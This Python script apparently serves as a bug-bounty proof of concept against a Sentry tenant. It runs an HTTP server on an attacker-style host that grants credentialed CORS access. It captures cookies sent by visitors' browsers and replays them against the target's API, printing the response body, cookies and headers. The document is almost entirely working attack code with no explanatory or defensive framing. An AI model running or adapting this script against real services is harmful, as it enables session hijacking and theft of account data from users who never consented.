#!/usr/bin/env python
try:
    from http import server # Python 3
except ImportError:
    import SimpleHTTPServer as server # Python 2
from urllib.parse import urlparse, parse_qs, unquote
import requests
from http.cookies import SimpleCookie
import time

class MyHTTPRequestHandler(server.SimpleHTTPRequestHandler):

    def log_message(self, format, *args):
        pass
 

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', "http://hackerone1.sentry.io")
        self.send_header("Access-Control-Allow-Methods", "*")
        self.send_header("Access-Control-Allow-Headers", "*")
        self.send_header("Access-Control-Allow-Credentials", "true")
        self.end_headers()

    def do_POST(self):
        try:
            clean_headers = {}
            cookies = {}
            #print(self.headers)
            self.send_response(200)
            self.send_header('Access-Control-Allow-Origin', "http://hackerone1.sentry.io")
            self.send_header("Access-Control-Allow-Methods", "*")
            self.send_header("Access-Control-Allow-Headers", "*")
            self.send_header("Access-Control-Allow-Credentials", "true")
            if "Cookie" in self.headers:
            #print(self.headers.get("Cookie"))
                cookies_raw = self.headers.get("Cookie")
                cookie = SimpleCookie()
                cookie.load(cookies_raw)
                cookies = {k: v.value for k, v in cookie.items()}
            #for header in self.headers.keys():
                #if header == "origin" or header == "Cookie": continue
                #clean_head = unquote(header.lower()).strip()
                #clean_value = unquote(self.headers[header].lower()).strip()
                #clean_headers[clean_head] = self.headers[header]
                #if "origin" in clean_head:
                    #if clean_headers[clean_head] == "hackerone1.sentry.io":
            self.end_headers()
            #query = parse_qs(urlparse(self.path).query)
            #if "/" not in query["url"][0]:
                #query["url"][0] += "/"
            #split_query = query["url"][0].split("/")
            clean_headers["host"] = "hackerone1.sentry.io"
            clean_headers["Origin"] = "hackerone1.sentry.io"
            r = requests.get("https://hackerone1.sentry.io/api/0/", headers=clean_headers, cookies=cookies)
            print(r.status_code)
            print(r.text)
            if ("Access-Control-Allow-Origin" in r.headers) and clean_headers["Origin"] in r.headers["Access-Control-Allow-Origin"]:
                print(clean_headers["Origin"])
            if ("Access-Control-Allow-Credentials" in r.headers) and r.headers["Access-Control-Allow-Credentials"] == "true":
                print(f"{clean_headers['Origin']}, {r.cookies}")
                print(f"[HEADERS]: {r.headers}")
        except Exception as e:
            return

        return 
                
        


if __name__ == '__main__':
    server.test(HandlerClass=MyHTTPRequestHandler, port=3000, bind="test1.testpocexample.com")

    